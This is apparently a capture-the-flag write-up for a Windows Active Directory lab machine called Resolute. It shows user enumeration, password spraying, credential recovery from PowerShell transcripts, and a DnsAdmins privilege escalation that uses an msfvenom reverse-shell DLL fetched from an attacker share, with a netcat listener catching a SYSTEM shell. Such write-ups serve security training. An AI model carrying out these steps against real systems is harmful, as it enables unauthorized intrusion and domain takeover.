# Resolute

# Skills

# Enumeration

A basic port scan showed that this is probably a active directory machine.

```bash
PORT      STATE SERVICE          REASON
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49669/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49678/tcp open  unknown          syn-ack
49679/tcp open  unknown          syn-ack
49684/tcp open  unknown          syn-ack
49707/tcp open  unknown          syn-ack
```

If that’s the case crackmapexec should gives us more insight about it.

```bash
┌──(kali㉿kali)-[~/machines/windows/resolute]
└─$ crackmapexec smb 10.10.10.169                                            
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
```

We don’t see any reference to a domain controller in the name, but we have a domain name: `megabank.local` . Now we are going to check every service to see what we can get.

## SMB

- Need credentials

```bash
┌──(kali㉿kali)-[~/machines/windows/resolute/enumeration]
└─$ crackmapexec smb 10.10.10.169 -u '%' -p'%' --shares
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\%:% STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/windows/resolute/enumeration]
└─$ smbclient -L \\\\10.10.10.169\\ 
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## RPC

- We can enumerate the domain using RPC

First we will enumerate the users.

```bash
┌──(kali㉿kali)-[~/machines/windows/resolute/enumeration]
└─$ rpcclient -U '%' 10.10.10.169                     
rpcclient $> enumdomusrs
command not found: enumdomusrs
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

## LDAP

- We can connect without a user to LDAP

```bash
┌──(kali㉿kali)-[~/machines/windows/resolute/enumeration]
└─$ ldapsearch -x -H ldap://10.10.10.169  -b "dc=megabank,dc=local"               
# extended LDIF
#
# LDAPv3
# base <dc=megabank,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# megabank.local
dn: DC=megabank,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=megabank,DC=local
instanceType: 5
whenCreated: 20190925132822.0Z
whenChanged: 20231106160222.0Z
subRefs: DC=ForestDnsZones,DC=megabank,DC=local
subRefs: DC=DomainDnsZones,DC=megabank,DC=local
subRefs: CN=Configuration,DC=megabank,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAI0kCuedEgkuD1X4NGZryvA==
uSNChanged: 151597
name: megabank
objectGUID:: RungtOfLt0KPoFxM7C/lqg==
replUpToDateVector:: AgAAAAAAAAAWAA
```

With all this we can try various attacks.

- ASP-ROAST attack
- ldapdomaindump (whole domain enumeration) → won’t work
- rpcenum https://github.com/s4vitar/rpcenum.git (partially enumerate the domain)

If we use rpcenum to dump all general information about users in the domain, we will see that one user has his password in his description.

```bash
+                 +                                                           +
  | User            | Description                                               |                                                                                                                                                           
  +                 +                                                           +                                                                                                                                                           
  | Administrator   | Built-in account for administering the computer/domain    |                                                                                                                                                           
  | Guest           | Built-in account for guest access to the computer/domain  |                                                                                                                                                           
  | krbtgt          | Key Distribution Center Service Account                   |                                                                                                                                                           
  | DefaultAccount  | A user account managed by the system.                     |                                                                                                                                                           
  | marko           | Account created. Password set to Welcome123!              |                                                                                                                                                           
  +                 +                                                           +
```

But it seems like the password is not correct.

```bash
┌──(kali㉿kali)-[~/machines/windows/resolute/rpcenum]
└─$ crackmapexec smb 10.10.10.169 -u 'marko' -p 'Welcome123!' --shares
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
```

Maybe this is the default password when an account is created and another users hasn’t changed it. So let’s create a dictionary with all the domain users and try this.

```bash
┌──(kali㉿kali)-[~/machines/windows/resolute]
└─$ crackmapexec smb 10.10.10.169 -u users.txt  -p 'Welcome123!' --continue-on-success
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE
```

We have credentials `melanie:Welcome123!` .

# Foothold

Actually, melanie is part of the Remote Management Users, so we can connect to the machine.

```bash
┌──(kali㉿kali)-[~/machines/windows/resolute]
└─$ crackmapexec winrm 10.10.10.169 -u 'melanie'  -p 'Welcome123!'     
SMB         10.10.10.169    5985   RESOLUTE         [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.10.10.169    5985   RESOLUTE         [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

We can connect using evil-winrm

```bash
┌──(kali㉿kali)-[~/machines/windows/resolute]
└─$ evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'   
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents>
```

In the \Users\ folder we see the user ryan, let’s see in what groups is this user.

```bash
*Evil-WinRM* PS C:\Users> dir

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:43 AM                Administrator
d-----        12/4/2019   2:46 AM                melanie
d-r---       11/20/2016   6:39 PM                Public
d-----        9/27/2019   7:05 AM                ryan
```

```bash
*Evil-WinRM* PS C:\Users> net user ryan
User name                    ryan
Full Name                    Ryan Bertrand
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/6/2023 8:32:02 AM
Password expires             Never
Password changeable          11/7/2023 8:32:02 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Contractors
The command completed successfully.
```

He is the group **Contractors** which is not a common group in active directory. After executing PoweUp.ps1 and winPEAS I have nothing, so let’s do a manual enumeration. Since there is not much to do on the box, let’s try to find files where the name **ryan** is mentioned.

```bash
findstr /SI "passw pwd ryan" *.xml *.ini *.txt *.ps1 *.bat *.config
```

Luckly, we get the password of this user in the output.

```bash
PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

So now we have the credentials `ryan:Serv3r4Admin4cc123!` , which actually are valid.

# Privilege escalation

From the previuos enumeration we could see that there is not much to do in the box, so the path to Administrator from Ryan must come from a new privilege that this user has.

If we use bloodhound to enumerate the domain, we will see that the user ryan is part of the **DNSAdmin** group, which means that we may have a possibility to escalate privilege.

- First we create a DLL with a reverse shell as payload

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > exploit.dll
```

- Inject it into the dns.exe process.

```bash
dnscmd RESOLUTE /config /serverlevelplugindll \\10.10.14.12\share\web.dll
```

- Stop and start the service

```bash
cmd /c sc.exe stop dns
cmd /c sc.exe start dns
```

I had to repeat the injection and the restart various times until I got a shell.

```bash
┌──(kali㉿kali)-[~/machines/windows/resolute]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.169] 56380
Microsoft Windows [Version 10.0.14393]                                                                                                                                                                                                      
(c) 2016 Microsoft Corporation. All rights reserved.                                                                                                                                                                                        
                                                                                                                                                                                                                                            
C:\Windows\system32>whoami                                                                                                                                                                                                                  
whoami
nt authority\system
```